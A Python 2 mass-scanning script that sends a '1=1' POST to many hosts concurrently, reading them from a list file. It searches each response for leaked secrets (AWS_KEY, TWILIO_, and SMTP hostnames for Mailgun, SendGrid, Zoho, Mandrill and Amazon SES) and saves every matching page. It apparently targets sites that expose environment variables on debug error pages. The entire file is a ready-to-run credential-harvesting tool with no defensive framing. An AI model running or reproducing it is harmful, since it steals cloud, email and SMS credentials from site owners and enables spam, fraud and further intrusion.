from twisted.internet import reactor, threads
from urlparse import urlparse
import httplib
import itertools
from sys import argv
import re

concurrent = 200
finished=itertools.count(1)
reactor.suggestThreadPoolSize(concurrent)

	
def getBody(ourl):
    
        url = urlparse('http://'+ourl)
        conn = httplib.HTTPConnection(url.netloc)
        params = '1=1'   
        conn.request("POST", url.path, params)
        res = conn.getresponse()
        bodinya = res.read()
        if re.search("outlook.com", bodinya):
            print "K.DEBUG > ", ourl
            open(url.netloc+'.html',"w+").write(bodinya)
        elif re.search("AWS_KEY", bodinya):
            print "K.DEBUG > ", ourl
            open(url.netloc+'.html',"w+").write(bodinya)
        elif re.search("email-smtp.", bodinya):
            print "K.DEBUG > ", ourl
            open(url.netloc+'.html',"w+").write(bodinya)
        elif re.search("mandrill", bodinya):
            print "K.DEBUG > ", ourl
            open(url.netloc+'.html',"w+").write(bodinya)
        elif re.search("smtp.mailgun", bodinya):
            print "K.DEBUG > ", ourl
            open(url.netloc+'.html',"w+").write(bodinya)
        elif re.search("smtp.sendgrid", bodinya):
            print "K.DEBUG > ", ourl
            open(url.netloc+'.html',"w+").write(bodinya)
        elif re.search("smtp.zoho", bodinya):
            print "K.DEBUG > ", ourl
            open(url.netloc+'.html',"w+").write(bodinya)
        elif re.search("sendinblue.com", bodinya):
            print "K.DEBUG > ", ourl
            open(url.netloc+'.html',"w+").write(bodinya)
        elif re.search("CLICKSEND", bodinya):
            print "K.DEBUG > ", ourl
            open(url.netloc+'.html',"w+").write(bodinya)
        elif re.search("TWILIO_", bodinya):
            print "K.DEBUG > ", ourl
            open(url.netloc+'.html',"w+").write(bodinya)
        else:
            print "NO.DEBUG > ", ourl
    # elif re.search('https://',ourl):
    #     url = urlparse(ourl)
    #     conn = httplib.HTTPConnection(url.netloc)
    #     params = '1=1'   
    #     conn.request("POST", url.path, params)
    #     res = conn.getresponse()
    #     bodinya = res.read()
    #     if re.search("MAIL_HOST", bodinya):
    #         print "K.DEBUG > ", ourl
    #         open(url.netloc+'.html',"w+").write(bodinya)
    #     else:
    #         # print("No match")
    #         print "NO.DEBUG > ", ourl
    # else:
    #     url = urlparse('http://'+ourl)
    #     conn = httplib.HTTPConnection(url.netloc)
    #     params = '1=1'   
    #     conn.request("POST", url.path, params)
    #     res = conn.getresponse()
    #     bodinya = res.read()
    #     if re.search("MAIL_HOST", bodinya):
    #         print "K.DEBUG > ", ourl
    #         open(url.netloc+'.html',"w+").write(bodinya)
    #     else:
    #         # print("No match")
    #         print "NO.DEBUG > ", ourl
        

            
    


def processError(error,url):
    print "error", url#, error
    processedOne()

def processedOne():
    if finished.next()==added:
        reactor.stop()

def addTask(url):
    req = threads.deferToThread(getBody, url)
   # req.addCallback(processResponse, url)
    req.addErrback(processError, url)   

added=0

lists = argv[1]
numthread = argv[2]
readsplit = open(lists).read().splitlines()

for url in readsplit:
    added+=int(numthread)
    addTask(url.strip())

try:
    reactor.run()
except KeyboardInterrupt:
    reactor.stop()
